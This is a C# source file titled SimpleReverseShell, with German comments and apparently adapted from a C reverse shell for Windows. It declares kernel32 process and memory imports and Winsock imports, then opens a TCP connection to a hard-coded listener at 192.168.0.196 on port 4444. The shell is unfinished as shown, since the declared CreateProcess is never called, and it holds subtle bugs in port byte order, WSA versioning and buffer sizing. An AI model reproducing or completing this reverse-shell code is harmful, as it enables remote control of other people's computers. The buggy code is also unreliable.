using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static SimpleReverseShell.SimpleSysCallShell;

namespace SimpleReverseShell
{
  // Vorlage für diese Implementierung: https://github.com/izenynn/c-reverse-shell/blob/main/windows.c
  internal class SimpleSysCallShell
  {
    #region MemoryManagement
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll")]
    public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
      public IntPtr ExitStatus;
      public IntPtr PebAddress;
      public IntPtr AffinityMask;
      public IntPtr BasePriority;
      public IntPtr UniquePID;
      public IntPtr InheritedFromUniqueProcessId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
      public Int32 cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public Int32 dwX;
      public Int32 dwY;
      public Int32 dwXSize;
      public Int32 dwYSize;
      public Int32 dwXCountChars;
      public Int32 dwYCountChars;
      public Int32 dwFillAttribute;
      public Int32 dwFlags;
      public Int16 wShowWindow;
      public Int16 cbReserved2;
      public IntPtr lpReserved2;
      public IntPtr hStdInput;
      public IntPtr hStdOutput;
      public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
      public IntPtr hProcess;
      public IntPtr hThread;
      public int dwProcessId;
      public int dwThreadId;
    }
    public static class CreationFlags
    {
      public const uint SUSPENDED = 0x4;
    }
    public const int PROCESSBASICINFORMATION = 0;
    #endregion

    #region Sockets
    /// <summary>
    /// Importierte Methode um Socket zu erzeugen.
    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
    /// </summary>
    /// <param name="af">Address family. Wert von 2 entspricht IPv4.</param>
    /// <param name="type">Socket Type. Wert von 1 entspricht stream.</param>
    /// <param name="protocol">Protokoll. Wert von 6 entspricht tcp.</param>
    /// <param name="protocolInfo">Kann NULL sein.</param>
    /// <param name="group">Kann NULL sein.</param>
    /// <param name="dwFlags">Kann NULL sein.</param>
    /// <returns></returns>
    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern IntPtr WSASocketA(int af, int type, int protocol, IntPtr protocolInfo, int group, int dwFlags);

    /// <summary>
    /// Importierte Methode um ein Socket zu connecten.
    /// Dokumentation: https://learn.microsoft.com/de-de/windows/win32/api/winsock2/nf-winsock2-connect
    /// </summary>
    /// <param name="socket">Das Socket.</param>
    /// <param name="name">Pointer auf eine SockAddr Struktur. <see cref="https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2"/></param>
    /// <param name="namelen">Länge der Sockaddr Struktur</param>
    /// <returns></returns>
    [DllImport("Ws2_32.dll", SetLastError = true)]
    public static extern int connect(IntPtr socket, IntPtr name, int namelen);

    /// <summary>
    /// Fragt den letzten Fehlercode ab. Eine Referenz zu Fehlercodes: https://learn.microsoft.com/en-us/windows/win32/winsock/windows-sockets-error-codes-2
    /// </summary>
    /// <returns></returns>
    [DllImport("Ws2_32.dll")]
    public static extern int WSAGetLastError();

    /// <summary>
    /// Initialisiert die Sockets, dass diese verwendet werden können.
    /// </summary>
    /// <param name="maxVersionRequired">Die max Version der Spezifikation die benutzt wird.</param>
    /// <param name="WSAData">Pointer auf die WSAData Struktur.</param>
    /// Doku: https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
    /// <returns></returns>
    [DllImport("Ws2_32.dll")]
    public static extern int WSAStartup(ushort maxVersionRequired, WSAData WSAData);

    /// <summary>
    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-wsaprotocol_infoa
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    internal struct WSAPROTOCOL_INFOA
    {
      int dwServiceFlags1;
      int dwServiceFlags2;
      int dwServiceFlags3;
      int dwServiceFlags4;
      int dwProviderFlags;
      Guid ProviderId;
      int dwCatalogEntryId;
      WSAPROTOCOLCHAIN ProtocolChain;
      int iVersion;
      int iAddressFamily;
      int iMaxSockAddr;
      int iMinSockAddr;
      int iSocketType;
      int iProtocol;
      int iProtocolMaxOffset;
      int iNetworkByteOrder;
      int iSecurityScheme;
      int dwMessageSize;
      int dwProviderReserved;
      char[] szProtocol;
    }

    /// <summary>
    /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-wsaprotocolchain
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    internal struct WSAPROTOCOLCHAIN
    {
      int ChainLen;
      int ChainEntries;
    }

    /// <summary>
    /// Dokumentation: https://learn.microsoft.com/de-de/windows/win32/api/winsock2/nf-winsock2-socket
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    internal struct SOCKET
    {
      int af;
      int type;
      int protocol;
    }

    /// <summary>
    /// Dokumentation zu diesem Struct: https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    internal struct SockAddr_In
    {
      internal short s_family;
      internal ushort s_port;
      internal In_Addr s_addr;
      [MarshalAsAttribute(UnmanagedType.ByValTStr, SizeConst = 8)]
      internal string sin_zero;
    }

    /// <summary>
    /// Repräsentiert eine IPv4 Adresse.
    /// Dokumentation hierzu: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    internal struct In_Addr
    {
      internal S_Un S_un;
    }

    [StructLayoutAttribute(LayoutKind.Sequential)]
    public struct S_Un
    {

      public S_un_b S_un_b;

      public S_un_w S_un_w;

      public uint S_addr;
    }

    [StructLayoutAttribute(LayoutKind.Sequential)]
    public struct S_un_b
    {
      /// u_char->unsigned char
      public byte s_b1;

      /// u_char->unsigned char
      public byte s_b2;

      /// u_char->unsigned char
      public byte s_b3;

      /// u_char->unsigned char
      public byte s_b4;
    }

    [StructLayoutAttribute(LayoutKind.Sequential)]
    public struct S_un_w
    {
      /// u_short->unsigned short
      public ushort s_w1;

      /// u_short->unsigned short
      public ushort s_w2;
    }

    /// <summary>
    /// Dokumentation zu diesem Struct: https://learn.microsoft.com/de-de/windows/win32/winsock/sockaddr-2
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    internal struct SockAddr
    {
      internal ushort sa_family;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
      internal string sa_data;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct WSAData
    {
      ushort wVersion;
      ushort wHighVersion;
      ushort iMaxSockets;
      ushort iMaxUdpDg;
      IntPtr lpVendorInfo;
      byte[] szDescription;
      byte[] szSystemStatus;
      ushort iMaxUdpg;
    }

    #endregion

    public void Start()
    {
      var wsa = new WSAData();
      var statusCode = WSAStartup((ushort)2.2, wsa);

      if (statusCode != 0)
      {
        Console.WriteLine($"WSA Startup fail with statuscode {statusCode}");
        throw new InvalidOperationException();
      }

      var protcolInfo = new WSAPROTOCOL_INFOA();

      var addrIn = new In_Addr();
      addrIn.S_un.S_addr = ConvertFromIPAddress(IPAddress.Parse("192.168.0.196"));

      var sockAddrIn = new SockAddr_In();
      sockAddrIn.s_family = 2;
      sockAddrIn.s_port = 4444;
      sockAddrIn.s_addr = addrIn;

      var sockAddrIntPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
      Marshal.StructureToPtr(sockAddrIn, sockAddrIntPtr, false);
      
      var sockAddr = Marshal.PtrToStructure<SockAddr>(sockAddrIntPtr);

      var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);

      var lastError = WSAGetLastError();

      if (lastError != 0)
      {
        Console.WriteLine($"WSASocketA failed with error code {lastError}");
        throw new InvalidOperationException();
      }

      var addrPointer = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIntPtr));
      Marshal.StructureToPtr(sockAddr, addrPointer, false);
      var connectSuccess = connect(socket, addrPointer, 16);
      
      if (connectSuccess != 0)
      {
        var errorCode = WSAGetLastError();
      }
    }

    private uint ConvertFromIPAddress(IPAddress ipAddress)
    {
      var bytes = ipAddress.GetAddressBytes();

      if (BitConverter.IsLittleEndian)
      {
        Array.Reverse(bytes);
      }

      return BitConverter.ToUInt32(bytes);
    }
  }
}
